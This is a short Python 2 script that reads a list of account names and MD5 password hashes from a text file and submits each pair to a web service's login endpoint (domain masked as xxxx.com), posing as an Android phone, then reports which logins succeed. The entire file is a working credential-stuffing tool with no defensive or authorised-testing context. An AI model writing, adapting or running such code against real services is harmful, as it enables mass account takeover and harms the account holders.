#!C:\Python27\python.exe
# -*- coding: UTF-8 -*-
'''
@author: sunyx
'''
import requests
import re
'''
数据格式
(158x,E10ADC3949BA59ABBE56E057F20F883E),
(258x,E10ADC3949BA59ABBE56E057F20F883E),
(358x,E10ADC3949BA59ABBE56E057F20F883E),
(768x,E10ADC3949BA59ABBE56E057F20F883E)
'''

result= []
of = open('datatext.txt','r')
fr = of.readlines()
fs = []
for line in fr:
    line = line.strip(',\n').strip('(').strip(')').split(',')
    fs.append(line)
#print 'fs:',fs

for fd in fs:
    login_account = fd[0]
    login_pwd = fd[1]
    #print 'login_account:',login_account,'login_pwd:',login_pwd
    url = 'https://www.xxxx.com/serviceoperate.svc/logincommit';
    jsondata = {'account':login_account,
            'password':login_pwd,
            'sp':{"cv":"1.0","from":"android","iv":"1","m":"GT-I9505","o":"KOT49H","v":"4.4.2"}
            }
    rs = requests.post(url,json=jsondata)
    rf = rs.text
    isrf = re.findall(u'\"msg\":\"成功\",\"status\":2000',rf)
    if bool(isrf):
        print login_account,'登录成功'
    else:
        print login_account,'登录失败'

of.close()